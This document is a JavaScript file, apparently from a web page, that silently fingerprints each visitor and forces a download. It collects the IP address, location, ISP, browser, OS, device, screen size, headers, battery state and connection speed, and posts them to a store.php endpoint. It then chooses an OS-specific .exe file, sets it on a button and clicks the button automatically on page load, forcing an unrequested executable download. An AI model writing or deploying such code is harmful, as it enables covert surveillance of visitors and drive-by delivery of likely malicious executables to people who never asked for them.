var getIpInfo=getIpInfo();
var InternetSpeed=getInternetSpeed();
var getHttpHeader=getHttpHeader();
var getScreeResolution=getScreeResolution()
var userData={
    IpAddress:window.ipaddr.IPv4.isIPv4(getIpInfo.ip)?getIpInfo.ip:getIpV4Info(),//ok
    BrowserTypeAndVersion:platform.name+' version '+platform.version,//ok
    OperatingSystem:`architecture:${platform.os.architecture}, family:${platform.os.family}, version:${platform.os.version},`,//ok 
    DeviceType:WURFL.form_factor,//ok
    ScreenResolution:getScreeResolution,//ok
    TimeAndDateOfVisit:getDate(),//ok
    ReferralSource:document.referrer,//ok
    Location:`City:${getIpInfo.city}, Country:${getIpInfo.country}`,//ok
    InternetServiceProvider:getIpInfo.org,//ok
    LanguagePreferences:navigator.language,//ok
    UserAgentString:navigator.userAgent,//ok
    WebPageVisited:document.location.href,//ok
    InternetSpeedAndConnectionType:'',//ok
    HTTPHeaders:getHttpHeader.headers,//ok
    deviceBatteryLevel:'',
    deviceChargingStatus:'',
}
function getIpInfo() {
    var http=new XMLHttpRequest();
    http.open('GET','https://ipapi.co/json/',false);
    http.send(null);
    return JSON.parse(http.responseText);
}
function getIpV4Info() {
    var http=new XMLHttpRequest();
    http.open('GET','https://ipv4.icanhazip.com/',false);
    http.send(null);
    return JSON.parse(http.responseText);
}
function getScreeResolution(){
    var screenSize = '';
    if (screen.width) {
        width = (screen.width) ? screen.width : '';
        height = (screen.height) ? screen.height : '';
        screenSize += '' + width + " x " + height;
    }
    return screenSize;
}
function getHttpHeader (){
    var req = new XMLHttpRequest();
    req.open('GET', document.location, false);
    req.send(null);
    var headers = req.getAllResponseHeaders().toLowerCase().split('\r\n').join(", ");
    return {headers};
}
function fileTodownload(){
    let os=platform.os.family;
    let version=platform.os.version;
    let btn=document.getElementsByClassName('btn')[0];
    if(os.indexOf('Windows')!=-1 && version==7){
        btn.href='../assets/files/W7.exe'
        btn.download='W7.exe'
    }else
    if(os.indexOf('iOS')!=-1 ||
    os.indexOf('Linux')!=-1||
    os.indexOf('OS X')!=-1||
    os.indexOf('Ubuntu')!=-1||
    os.indexOf('Debian')!=-1||
    os.indexOf('Fedora')!=-1||
    os.indexOf('Red Ha')!=-1){
        btn.href='../assets/files/IML.exe'
        btn.download='IML.exe'
    }else
    if(os.indexOf('Android')!=-1){
        btn.href='../assets/files/AND.exe'
        btn.download='AND.exe'
    }
    else if(os.indexOf('Windows')!=-1 && version==10){
        btn.href='../assets/files/W10.exe'
        btn.download='W10.exe'
    }
    window.onload = function() {
        btn.click();
    };
}
//Battery information
function getBatteryInfo(){
    if(navigator.getBattery){
        navigator.getBattery().then((battery) => {
            userData.deviceChargingStatus=battery.charging? 'Charging' : 'Not charging'
            userData.deviceBatteryLevel=`${battery.level*100}%`
        })
    }
}
function sendDataToStore(){
    setTimeout(() => {
        $.ajax({
            url: "store.php",
            type: "post",
            data: { data: JSON.stringify(userData) },
            success: function(response) {
            //   console.log(response);
            }});
    }, 200);
}
function getDate(){
    const now = new Date();
    return now.toLocaleString();
}
function getInternetSpeed() {
    return new Promise(function(resolve, reject) {
        var testImage = new Image();
        var startTime, endTime;
        testImage.onload = function() {
            endTime = (new Date()).getTime();
            var SPEED = (10 * 1024) / ((endTime - startTime) / 1000);
            resolve(Math.floor(SPEED));
        };
        startTime = (new Date()).getTime();
        testImage.src = "../assets/Logo connection.png";
    });
}
getBatteryInfo();
fileTodownload();
getInternetSpeed().then(function(speed) {
    userData.InternetSpeedAndConnectionType=`${speed} KB/s`;
    sendDataToStore();
});